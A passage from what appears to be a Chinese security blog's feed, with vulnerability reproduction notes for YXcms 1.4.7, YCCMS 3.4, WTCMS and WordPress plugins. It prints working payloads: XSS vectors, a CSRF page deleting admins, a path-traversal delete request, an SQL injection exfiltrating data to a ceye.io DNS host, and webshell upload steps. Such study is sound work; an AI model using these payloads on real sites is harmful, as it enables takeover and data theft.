        <content type="html"><![CDATA[<p>###1.影响版本 ###<br>YXcms 1.4.7</p><h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2.复现过程"></a>2.复现过程</h3><p>前台有留言板的功能，进行测试：<br>payload：</p><pre><code>&lt;svg/onload=alert(1)&gt;</code></pre><p><img src="YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/YPUuIs.png" alt><br>当管理员在后台查看留言的时候，就能触发<code>xss：</code><br><img src="YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/YPUJLF.png" alt><br>可以通过这个xss来获取管理员的cookie，从而进入网站后台。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1.影响版本"></a>1.影响版本</h3><p>1.4.7</p><h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2.复现过程"></a>2.复现过程</h3><p>漏洞位置还在后台：</p><p>在对文章编辑的页面上，发现存在删除已上传的图片的功能<br><img src="YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/YiMl4O.png" alt><br>设置抓包，点击删除：<br><img src="YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/YiQ8oV.png" alt></p><p>虽然显示的是缩略图不存在，但是通过查看发现已经删除了123.txt这个文件</p><p>也是存在任意文件删除</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1.影响版本"></a>1.影响版本</h3><p>YXcms 1.4.7</p><p>###2. 复现过程 ###<br>这个漏洞是在后台</p><p>看到了这里有一个删除的按钮</p><p><img src="YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/Yiuxw6.png" alt><br>点击删除，进行抓包：</p><p>通过控制fname参数可以实现任意文件删除的功能</p><p><img src="YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/YiKk61.png" alt><br><strong>代码分析</strong></p><p>代码位置protected/apps/admin/controller/filesController.php：</p><pre><code>public function del(){   $dirs=in($_GET[&apos;fname&apos;]);   $dirs=str_replace(&apos;,&apos;,&apos;/&apos;,$dirs);   $dirs=ROOT_PATH.&apos;upload&apos;.$dirs;   if(is_dir($dirs)){del_dir($dirs); echo 1;}    elseif(file_exists($dirs)){        if(unlink($dirs)) echo 1;   }else echo &apos;文件不存在&apos;; }</code></pre><p>对fname进行替换操作str_replace(‘,’,’/‘,$dirs);<br>讲参数最前面的分号(%2C)替换为/</p><p>然后完整的拼接路径，看文件是否存在，存在就进行删除<br>这里没有读传入的参数进行过滤，<br>可以及逆行上跳目录，从而达到任意文件删除的效果</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1.影响版本"></a>1.影响版本</h3><p>YXcms 1.4.7</p><h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2.复现过程"></a>2.复现过程</h3><p>进入网站后台。</p><pre><code>/index.php?r=admin/set/tpadd&amp;Mname=default</code></pre><p>新建模板文件：<br><img src="YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/YiVDXV.png" alt><br>可以创建任意的文件。。</p><p>通过目录结构，可以找到新的模板文件的位置：</p><pre><code>/protected/apps/default/view/default/phpinfo.php</code></pre><p><img src="YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/YiZPAg.png" alt><br>可以看到是我们写入的文件被执行了，所有可以写入一句话木马，来进行getshell。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>###1. 影响版本 ###<br>1.4.7</p><p>###2.漏洞复现 ###</p><p>url:/index.php?r=admin/fragment/index<br><img src="YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/Yi63i8.png" alt><br>利用ceye得到的回显<br>用bp抓包，修改id为</p><p> payload:</p><pre><code>2 and if((select load_file(concat(&apos;\\&apos;,(select database()),&apos;.36rdia.ceye.io\abc&apos;))),2,2)</code></pre><p>在ceye上面可以得到回显：</p><p><img src="YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/Yi6qOA.png" alt><br>得到了数据库名称yxcms<br><img src="YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/YicZkV.png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>YXcms 1.4.7版本中的protected/apps/admin/controller/adminController.php文件存在跨站请求伪造漏洞。远程攻击者可借助index.php?r=admin/admin/admindel利用该漏洞删除管理员账户。</p><p>###2.影响版本 ###<br>YXcms 1.4.7</p><p>###3. 复现过程 ###<br>管理员点击链接</p><pre><code>http://192.168.232.133/evil.html</code></pre><p>evil.html</p><pre><code>&lt;html&gt; &lt;a href=&quot;http://127.0.0.1/yxcms1.4.7/index.php?r=admin/admin/admindel&amp;id=1&quot;&gt;test&lt;/a&gt;&lt;/html&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>YCCMS 3.4</p><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><pre><code>POST /admin/?a=pic&amp;m=delall HTTP/1.1Host: 127.0.0.1:8082User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 89Origin: http://127.0.0.1:8082Connection: closeReferer: http://127.0.0.1:8082/admin/?a=picUpgrade-Insecure-Requests: 1pid%5B0%5D=../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t</code></pre><p>只需要更改pid[0]即可在无登录条件下任意删除文件，删除根目录下的1.txt<br><img src="YCCMS3.4任意文件删除/20200510143520-6bc12876-9288-1.png" alt><br>已经删除成功了</p><p><img src="YCCMS3.4任意文件删除/20200510143550-7d8c00bc-9288-1.png" alt></p><p>其实这还是犯了一个最容易犯的错误，没有对传进来的路径进行过滤就拼接了目录，导致了任意文件删除漏洞的产生<br>根据url定位到相关函数位置,位于/controller/PicAction.class.php</p><pre><code>public function delall(){if(isset($_POST[&apos;send&apos;])){if(validate::isNullString($_POST[&apos;pid&apos;])) tool::layer_alert(&apos;没有选择任何图片!&apos;,&apos;?a=pic&apos;,7);$_fileDir=ROOT_PATH.&apos;/uploads/&apos;;foreach($_POST[&apos;pid&apos;] as $_value){$_filePath=$_fileDir.$_value;if(!unlink($_filePath)){tool::layer_alert(&apos;图片删除失败,请设权限为777!&apos;,&apos;?a=pic&apos;,7);}else{header(&apos;Location:?a=pic&apos;);}}}}</code></pre><p>对 pid传进来的值并没有进行过滤就进行了了路径的拼接，导致了路径穿越漏洞，触发任意文件删除漏洞</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7748#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7748#toc-4</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>YCCMS 3.4</p><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><p>首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息<br><img src="YCCMS3.4未授权更改管理员账号密码/20200510141045-fc74068a-9284-1.png" alt><br>去数据库中查看发现已经更改了账号密码</p><p><img src="YCCMS3.4未授权更改管理员账号密码/20200510141951-41f6fa04-9286-1.png" alt><br>根据url来定位一下漏洞函数，函数位于controller\AdminAction.class.php中的update函数</p><pre><code>public function update(){if(isset($_POST[&apos;send&apos;])){if(validate::isNullString($_POST[&apos;username&apos;])) Tool::t_back(&apos;用户名不能为空&apos;,&apos;?a=admin&amp;m=update&apos;);if(validate::isNullString($_POST[&apos;password&apos;])) Tool::t_back(&apos;密码不能为空!&apos;,&apos;?a=admin&amp;m=update&apos;);if(!(validate::checkStrEquals($_POST[&apos;password&apos;], $_POST[&apos;notpassword&apos;]))) Tool::t_back(&apos;两次密码不一致!&apos;,&apos;?a=admin&amp;m=update&apos;);$this-&gt;_model-&gt;username=$_POST[&apos;username&apos;];$this-&gt;_model-&gt;password=sha1($_POST[&apos;password&apos;]);$_edit=$this-&gt;_model-&gt;editAdmin();if($_edit){tool::layer_alert(&apos;密码修改成功!&apos;,&apos;?a=admin&amp;m=update&apos;,6);}else{tool::layer_alert(&apos;密码未修改!&apos;,&apos;?a=admin&amp;m=update&apos;,6);}}$this-&gt;_tpl-&gt;assign(&apos;admin&apos;, $_SESSION[&apos;admin&apos;]);$this-&gt;_tpl-&gt;display(&apos;admin/public/update.tpl&apos;);}</code></pre><p>可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\AdminModel.class.php</p><pre><code>public function editAdmin(){$_sql=&quot;UPDATEmy_adminSETusername=&apos;$this-&gt;username&apos;,password=&apos;$this-&gt;password&apos;WHEREid=1LIMIT 1&quot;;return parent::update($_sql);}</code></pre><p>该函数的父类为Model, 位于model\Model.class.php，看一下update函数</p><pre><code>protected function update($_sql){return $this-&gt;execute($_sql)-&gt;rowCount();}</code></pre><p>调用execute函数去执行sql语句</p><pre><code>protected function execute($_sql){try{$_stmt=$this-&gt;_db-&gt;prepare($_sql);$_stmt-&gt;execute();}catch (PDOException $e){exit(&apos;SQL语句:&apos;.$_sql.&apos;&lt;br /&gt;错误信息:&apos;.$e-&gt;getMessage());}return $_stmt;}}</code></pre><p>这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id=1的数据，这也就造成了任意更改管理员账号密码</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7748#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7748#toc-2</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>YCCMS 3.4</p><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><pre><code>https://www.0-baize.org/admin/?a=html&amp;art=&lt;sCrIpT&gt;alert(ian)&lt;%2FsCrIpT&gt;&amp;m=arts</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>YCCMS 3.4</p><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><p><img src="YCCMS3.4任意文件上传漏洞（二）/20200510145117-a5da8b22-928a-1.png" alt><br>在不需要登录的情况下可以看到已经上传成功，上传地址为E:/phpstudy/WWW/yccms/uploads/20200509133351770.php<br>定位漏洞位置为controller\CallAction.class.php中的xhUp函数</p><pre><code>public function xhUp() {if (isset($_GET[&apos;type&apos;])) {$_fileupload = new FileUpload(&apos;filedata&apos;,10);$_err=$_fileupload-&gt;checkError();$_path = $_fileupload-&gt;getPath();$_msg=&quot;&apos;..$_path&apos;&quot;;$_img = new Image($_path);$_img-&gt;xhImg(650,0);$_img-&gt;out();echo &quot;{&apos;err&apos;:&apos;&quot;.$_err.&quot;&apos;,&apos;msg&apos;:&quot;.$_msg.&quot;}&quot;;exit();} else {Tool::alertBack(&apos;警告：由于非法操作导致上传失败！&apos;);}}</code></pre><p>跟进到类FileUpload， 位于public\class\FileUpload.class.php，然后看到同样也是检查的传入的Content-Type的值</p><pre><code>private function checkType() {if (!in_array($this-&gt;type,$this-&gt;typeArr)) {Tool::alertBack(&apos;警告：不合法的上传类型！&apos;);}}private $typeArr = array(&apos;image/jpeg&apos;,&apos;image/pjpeg&apos;,&apos;image/png&apos;,&apos;image/x-png&apos;,&apos;image/gif&apos;);</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7748#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7748#toc-4</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>YCCMS 3.4</p><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><p>在不需要登录的情况上传成功<br><img src="YCCMS3.4任意文件上传漏洞（一）/20200510144621-f54ef75c-9289-1.png" alt><br>定位到漏洞位置： controller\CallAction.class.php</p><pre><code>public function upLoad() {if (isset($_POST[&apos;send&apos;])) {$_logoupload = new LogoUpload(&apos;pic&apos;,$_POST[&apos;MAX_FILE_SIZE&apos;]);$_path = $_logoupload-&gt;getPath();$_img = new Image($_path);$_img-&gt;xhImg(960,0);$_img-&gt;out();//echo $_path;$_logoupload-&gt;alertOpenerClose(&apos;图片上传成功！&apos;,&apos;..&apos;.$_path);} else {exit(&apos;警告：文件过大或者其他未知错误导致浏览器崩溃！&apos;);}}</code></pre><p>然后跟进到类LogoUpload ,位于public\class\LogoUpload.class.php，上传首要关注上传是是否允许上传非图片格式的文件</p><pre><code>private function checkType() {if (!in_array($this-&gt;type,$this-&gt;typeArr)) {Tool::alertBack(&apos;警告：LOGO图片必须是PNG格式！&apos;);}}private $typeArr = array(&apos;image/png&apos;,&apos;image/x-png&apos;);//类型合集</code></pre><p>根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了<br><img src="YCCMS3.4任意文件上传漏洞（一）/20200510144939-6b7866c0-928a-1.png" alt></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7748#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7748#toc-4</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/WTCMS/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/WTCMS/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h3><p>1、登录后台后，进入注册邮件模板功能<br><img src="文件上传getshell/20190227145608-c2840672-3a5c-1.png" alt><br>2、使用编辑器上传一张图片，并抓包修改文件名及文件内容<br><img src="文件上传getshell/20190227145753-0102f7f0-3a5d-1.png" alt><br><img src="文件上传getshell/20190227145859-2864fdca-3a5d-1.png" alt><br>3、访问上传的php文件<br><img src="文件上传getshell/20190227150218-9f29ed80-3a5d-1.png" alt></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/4234" target="_blank" rel="noopener">https://xz.aliyun.com/t/4234</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress评论插件wpDiscuz任意文件上传漏洞"><a href="#WordPress评论插件wpDiscuz任意文件上传漏洞" class="headerlink" title="WordPress评论插件wpDiscuz任意文件上传漏洞"></a>WordPress评论插件wpDiscuz任意文件上传漏洞</h1><p>漏洞描述<br>wordpress评论插件wpDiscuz导致的任意文件上传漏洞，没有安装wpDiscuz插件是没有此漏洞的。<br>影响范围<br>wpDiscuz v7.0.0-v7.0.4<br>环境搭建<br><a href="https://cn.wordpress.org/latest-zh_CN.zip" target="_blank" rel="noopener">https://cn.wordpress.org/latest-zh_CN.zip</a><br><a href="https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip" target="_blank" rel="noopener">https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip</a><br>管理员登录，在插件模块安装wpdiscuz插件，即可看到评论界面变成这个样子，点击图片的小标可上传图片。<br><img src="wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/wp_editor_md_c812f626a0e2b2236eba98f0dbc44e62.jpg" alt="img"></p><p>上传一句话木马，修改为GTF头<br><img src="wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/wp_editor_md_26cd0f7846ca4dc67068c848dedd9e9b.jpg" alt="img"><br>蚁剑连接成功<br><img src="wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/wp_editor_md_93476dc9f2edfe4c3d72c963f7607175.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7_Info_Disclosure/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress-4-7-Info-Disclosure"><a href="#WordPress-4-7-Info-Disclosure" class="headerlink" title="WordPress_4.7_Info_Disclosure"></a>WordPress_4.7_Info_Disclosure</h1><h2 id="Official"><a href="#Official" class="headerlink" title="Official"></a>Official</h2><p><a href="https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/" target="_blank" rel="noopener">https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</a></p><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>WordPress 4.7 (4.7.1 fixed)</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p><strong>github获取脚本</strong></p><p><img src="WordPress_4.7_Info_Disclosure/poc.png" alt="poc.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://wpvulndb.com/vulnerabilities/8715" target="_blank" rel="noopener">https://wpvulndb.com/vulnerabilities/8715</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.7.0-4.7.1_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress-4-7-0-4-7-1-未授权内容注入"><a href="#WordPress-4-7-0-4-7-1-未授权内容注入" class="headerlink" title="WordPress_4.7.0-4.7.1_未授权内容注入"></a>WordPress_4.7.0-4.7.1_未授权内容注入</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><ul><li><p>WordPress 4.7.0</p></li><li><p>WordPress 4.7.1</p></li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>注意： 从官网下载相应漏洞版本后，需要在断网状态下进行安装测试，否则默认会自动更新修复该漏洞。</p><p>github获取脚本</p><p><img src="WordPress_4.7.0-4.7.1_未授权内容注入/poc.png" alt="poc.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><p><a href="https://www.exploit-db.com/exploits/41223/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41223/</a></p></li><li><p><a href="http://paper.seebug.org/208/" target="_blank" rel="noopener">http://paper.seebug.org/208/</a></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/WordPress_4.4_SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress-4-4-SSRF"><a href="#WordPress-4-4-SSRF" class="headerlink" title="WordPress_4.4_SSRF"></a>WordPress_4.4_SSRF</h1><h2 id="Official"><a href="#Official" class="headerlink" title="Official"></a>Official</h2><p><a href="https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/" target="_blank" rel="noopener">https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/</a></p><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>WordPress &lt;= 4.5</p><p>github获取</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>注意： 外网 SSRF 4.4.1 4.4.2 均测试通过，内网测试失败。</p><p><img src="WordPress_4.4_SSRF/poc.png" alt="poc.png"></p><p>DNGLog记录：</p><p><img src="WordPress_4.4_SSRF/dnslog.png" alt="dnslog.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="http://xlab.baidu.com/wordpress/" target="_blank" rel="noopener">http://xlab.baidu.com/wordpress/</a></li><li><a href="http://blog.csdn.net/cd_xuyue/article/details/52276443" target="_blank" rel="noopener">http://blog.csdn.net/cd_xuyue/article/details/52276443</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
